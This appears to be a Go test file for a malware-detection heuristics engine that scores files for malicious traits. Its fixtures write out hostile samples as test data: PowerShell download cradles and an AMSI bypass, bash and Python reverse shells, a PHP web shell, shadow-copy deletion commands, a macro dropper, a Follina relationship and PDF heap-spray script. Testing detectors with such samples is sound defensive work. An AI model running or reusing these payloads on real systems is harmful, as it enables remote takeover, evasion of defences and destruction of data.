package heuristics

import (
	"bytes"
	"compress/zlib"
	"encoding/base64"
	"strings"
	"testing"
)

// EICAR is built from pieces so this file isn't flagged by antivirus.
func eicarSample() []byte {
	return []byte(`X5O!P%@AP[4\PZX54(P^)7CC)7}$` + "EICAR-STANDARD-" + "ANTIVIRUS-TEST-FILE!$H+H*")
}

// compressVBALiteral produces a valid MS-OVBA container using only literal
// tokens, which is enough to exercise the decompressor and macro detection.
func compressVBALiteral(src []byte) []byte {
	out := []byte{0x01}
	for len(src) > 0 {
		// Literal-only encoding grows by 1/8, so use chunks that still fit
		// the 12-bit compressed chunk size field.
		n := min(len(src), 3584)
		chunk := src[:n]
		src = src[n:]
		var body []byte
		for i := 0; i < len(chunk); i += 8 {
			body = append(body, 0x00) // all 8 tokens are literals
			body = append(body, chunk[i:min(i+8, len(chunk))]...)
		}
		size := len(body) + 2
		hdr := uint16(0x8000|0x3000) | uint16(size-3)
		out = append(out, byte(hdr), byte(hdr>>8))
		out = append(out, body...)
	}
	return out
}

func score(t *testing.T, name string, data []byte) (int, []Finding) {
	t.Helper()
	fs, _ := Analyze(name, data, Detect(data))
	return Score(fs), fs
}

func names(fs []Finding) string {
	var s []string
	for _, f := range fs {
		s = append(s, f.Name)
	}
	return strings.Join(s, ",")
}

func TestEICAR(t *testing.T) {
	if s, fs := score(t, "eicar.com", eicarSample()); s < 100 {
		t.Fatalf("EICAR not detected: %d %s", s, names(fs))
	}
}

func TestDetect(t *testing.T) {
	cases := map[string]FileType{
		"MZ\x90\x00":                       TypePE,
		"\x7fELF\x02\x01":                  TypeELF,
		"%PDF-1.7\n":                       TypePDF,
		"PK\x03\x04rest":                   TypeZip,
		"{\\rtf1\\ansi":                    TypeRTF,
		"#!/bin/sh\necho hi\n":             TypeText,
		"\x1f\x8b\x08\x00":                 TypeGzip,
		"BZh91AY&SY":                       TypeBzip2,
		"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1": TypeOLE,
	}
	for in, want := range cases {
		if got := Detect([]byte(in)); got != want {
			t.Errorf("Detect(%q) = %s, want %s", in, got, want)
		}
	}
}

func TestMaliciousScripts(t *testing.T) {
	enc := base64.StdEncoding.EncodeToString([]byte(strings.Repeat("I\x00E\x00X\x00 \x00", 20)))
	cases := map[string]string{
		"dropper.ps1": `powershell.exe -NoP -W Hidden -Exec Bypass -EncodedCommand ` + enc,
		"cradle.bat":  `powershell -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a')"`,
		"amsi.ps1":    `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
		"rev.sh":      "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
		"miner.sh":    "#!/bin/sh\ncurl -s http://x.example/x | bash\npkill -f xmrig\n./kdevtmpfsi -o stratum+tcp://pool.example:3333\n",
		"shell.php":   `<?php if(isset($_POST['c'])){ system($_POST['c']); } ?>`,
		"obf.php":     `<?php eval(gzinflate(base64_decode('abc'))); @eval($_REQUEST['x']); ?>`,
		"rev.py":      "import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.1',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn('/bin/sh')",
		"ransom.bat":  "vssadmin delete shadows /all /quiet\r\nwbadmin delete catalog -quiet\r\nbcdedit /set {default} recoveryenabled no\r\n",
		"dl.js": `var sh = new ActiveXObject("WScript.Shell"); var x = new ActiveXObject("MSXML2.XMLHTTP");
x.open("GET","http://x.example/p.exe",false); x.send(); var s = new ActiveXObject("ADODB.Stream");
s.Open(); s.Type=1; s.Write(x.ResponseBody); s.SaveToFile("C:\\Users\\Public\\p.exe",2); sh.Run("cmd.exe /c C:\\Users\\Public\\p.exe");`,
	}
	for name, body := range cases {
		t.Run(name, func(t *testing.T) {
			if s, fs := score(t, name, []byte(body)); s < 100 {
				t.Errorf("score %d < 100 (%s)", s, names(fs))
			}
		})
	}
}

func TestBenignText(t *testing.T) {
	cases := map[string]string{
		"install.sh": "#!/bin/sh\nset -e\napt-get update\napt-get install -y curl\nmkdir -p /opt/app\ncp app /opt/app/\n",
		"readme.md":  "# Project\n\nRun `make` to build. See https://example.com for docs.\n",
		"app.js":     "import React from 'react';\nexport default function App(){ return fetch('/api').then(r => r.json()); }\n",
		"script.ps1": "Get-ChildItem -Path C:\\Logs | Where-Object { $_.Length -gt 1MB } | Remove-Item\n",
	}
	for name, body := range cases {
		if s, fs := score(t, name, []byte(body)); s >= 100 {
			t.Errorf("%s: false positive, score %d (%s)", name, s, names(fs))
		}
	}
}

func TestVBADecompressRoundTrip(t *testing.T) {
	src := []byte("Attribute VB_Name = \"Module1\"\r\nSub Hello()\r\nMsgBox \"hi\"\r\nEnd Sub\r\n" + strings.Repeat("' filler\r\n", 600))
	got, err := DecompressVBA(compressVBALiteral(src), 1<<20)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(got, src) {
		t.Fatalf("round trip mismatch: got %d bytes want %d", len(got), len(src))
	}
}

func TestVBACopyTokens(t *testing.T) {
	// Hand-built container from MS-OVBA 3.2.3 example: "#aaabcdefaaaaghijaaaaaklaaamnopqaaaaaaaaaaaarstuvwxyzaaa"
	in := []byte{0x01, 0x2F, 0xB0, 0x00, 0x23, 0x61, 0x61, 0x61, 0x62, 0x63, 0x64, 0x65, 0x82, 0x66, 0x00, 0x70,
		0x61, 0x67, 0x68, 0x69, 0x6A, 0x01, 0x38, 0x08, 0x61, 0x6B, 0x6C, 0x00, 0x30, 0x6D, 0x6E, 0x6F, 0x70,
		0x06, 0x71, 0x02, 0x70, 0x04, 0x10, 0x72, 0x73, 0x74, 0x75, 0x76, 0x10, 0x77, 0x78, 0x79, 0x7A, 0x00, 0x3C}
	want := "#aaabcdefaaaaghijaaaaaklaaamnopqaaaaaaaaaaaarstuvwxyzaaa"
	got, err := DecompressVBA(in, 1<<20)
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != want {
		t.Fatalf("got %q want %q", got, want)
	}
}

func TestMaliciousMacro(t *testing.T) {
	macro := "Attribute VB_Name = \"ThisDocument\"\r\n" +
		"Sub AutoOpen()\r\n" +
		"  Dim s: Set s = CreateObject(\"WScript.Shell\")\r\n" +
		"  s.Run \"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://x.example/a')\"\r\n" +
		"End Sub\r\n"
	// Simulate a vbaProject.bin: OLE header, junk, then the compressed module.
	ole := append([]byte{0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1}, make([]byte, 600)...)
	ole = append(ole, compressVBALiteral([]byte(macro))...)
	ole = append(ole, make([]byte, 100)...)
	s, fs := score(t, "vbaProject.bin", ole)
	if s < 100 {
		t.Fatalf("macro dropper not detected: %d (%s)", s, names(fs))
	}
	if !strings.Contains(names(fs), "Heuristic.Macro.AutoExec") {
		t.Errorf("expected AutoExec finding, got %s", names(fs))
	}

	benign := "Attribute VB_Name = \"Module1\"\r\nSub FormatReport()\r\n  Range(\"A1\").Font.Bold = True\r\nEnd Sub\r\n"
	ole2 := append([]byte{0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1}, make([]byte, 600)...)
	ole2 = append(ole2, compressVBALiteral([]byte(benign))...)
	if s, fs := score(t, "vbaProject.bin", ole2); s >= 100 {
		t.Fatalf("benign macro flagged: %d (%s)", s, names(fs))
	}
}

func TestFollina(t *testing.T) {
	rels := `<?xml version="1.0"?><Relationships><Relationship Id="rId996" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="mhtml:http://x.example/a.html!x-usc:http://x.example/a.html" TargetMode="External"/><Relationship Target="ms-msdt:/id PCWDiagnostic" TargetMode="External"/></Relationships>`
	fs, _ := Analyze("word/_rels/document.xml.rels", []byte(rels), TypeText)
	if Score(fs) < 100 {
		t.Fatalf("Follina not detected: %s", names(fs))
	}
}

func TestPDF(t *testing.T) {
	js := `var s = unescape("%u0c0c%u0c0c"); while (s.length < 0x40000) s += s; util.printf("%45000f", 1);`
	var z bytes.Buffer
	zw := zlib.NewWriter(&z)
	zw.Write([]byte(js))
	zw.Close()
	pdf := []byte("%PDF-1.4\n1 0 obj << /Type /Catalog /OpenAction 2 0 R >> endobj\n2 0 obj << /S /J#61vaScript /JS 3 0 R >> endobj\n3 0 obj << /Filter /FlateDecode /Length " +
		itoa(z.Len()) + " >>\nstream\n")
	pdf = append(pdf, z.Bytes()...)
	pdf = append(pdf, []byte("\nendstream\nendobj\n%%EOF\n")...)
	s, fs := score(t, "invoice.pdf", pdf)
	if s < 100 {
		t.Fatalf("malicious PDF not detected: %d (%s)", s, names(fs))
	}
	benign := []byte("%PDF-1.4\n1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n%%EOF\n")
	if s, fs := score(t, "doc.pdf", benign); s != 0 {
		t.Fatalf("benign PDF scored %d (%s)", s, names(fs))
	}
}

func TestPDFEmbeddedExecutableIsChild(t *testing.T) {
	var z bytes.Buffer
	zw := zlib.NewWriter(&z)
	zw.Write(append([]byte("MZ\x90\x00"), make([]byte, 200)...))
	zw.Close()
	pdf := append([]byte("%PDF-1.4\n1 0 obj << /Type /EmbeddedFile /Filter /FlateDecode >>\nstream\n"), z.Bytes()...)
	pdf = append(pdf, []byte("\nendstream\nendobj\n")...)
	_, children := Analyze("a.pdf", pdf, TypePDF)
	if len(children) != 1 || Detect(children[0].Data) != TypePE {
		t.Fatalf("expected embedded PE to be extracted, got %d children", len(children))
	}
}

func TestNames(t *testing.T) {
	pe := []byte("MZ")
	if s := Score(NameFindings("invoice.pdf.exe", TypeUnknown)); s < 50 {
		t.Errorf("double extension not flagged")
	}
	if s := Score(NameFindings("photo\u202egpj.exe", TypeUnknown)); s < 80 {
		t.Errorf("RLO not flagged")
	}
	if s := Score(NameFindings("report.pdf", Detect(pe))); s < 60 {
		t.Errorf("masquerade not flagged")
	}
	if s := Score(NameFindings("setup.exe", Detect(pe))); s != 0 {
		t.Errorf("benign exe flagged: %d", s)
	}
}

func TestLNK(t *testing.T) {
	var b bytes.Buffer
	b.Write([]byte{0x4C, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00})
	b.Write(make([]byte, 68))
	for _, r := range `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a')"` {
		b.WriteByte(byte(r))
		b.WriteByte(0)
	}
	if s, fs := score(t, "Invoice.lnk", b.Bytes()); s < 100 {
		t.Fatalf("malicious LNK not detected: %d (%s)", s, names(fs))
	}
}

func TestRTFEquation(t *testing.T) {
	rtf := `{\rtf1{\object\objemb\objupdate{\*\objclass Equation.3}{\*\objdata 0105000002000000080000004571756174696f6e2e33}}}`
	if s, fs := score(t, "doc.rtf", []byte(rtf)); s < 100 {
		t.Fatalf("RTF exploit not detected: %d (%s)", s, names(fs))
	}
}

func TestEntropy(t *testing.T) {
	if e := Entropy(bytes.Repeat([]byte{'a'}, 100)); e != 0 {
		t.Errorf("entropy of constant = %f", e)
	}
	b := make([]byte, 256*4)
	for i := range b {
		b[i] = byte(i)
	}
	if e := Entropy(b); e < 7.99 {
		t.Errorf("entropy of uniform = %f", e)
	}
}
